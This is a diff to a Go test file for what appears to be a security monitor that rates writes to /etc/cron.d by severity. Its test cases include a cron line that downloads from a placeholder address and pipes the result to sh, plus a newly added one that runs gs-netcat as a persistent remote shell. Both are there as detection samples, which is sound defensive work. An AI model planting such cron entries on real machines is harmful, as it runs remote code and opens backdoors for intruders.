@@ -38,6 +38,7 @@ func testSensitiveWriteCronDangerVeto(t *testing.T, ancestry bool) {
 	}{
 		{"benign", "0 1 * * * root /usr/sbin/maintenance\n", alert.Warning},
 		{"dangerous", "* * * * * root curl http://192.0.2.1/job | sh\n", alert.High},
+		{"known_persistence", "* * * * * root /usr/local/bin/gs-netcat -i\n", alert.High},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			f, ok := EvaluateSensitiveFileWriteSnapshot("/etc/cron.d/test", 0, 4242, "writer", []byte(tc.content), true)
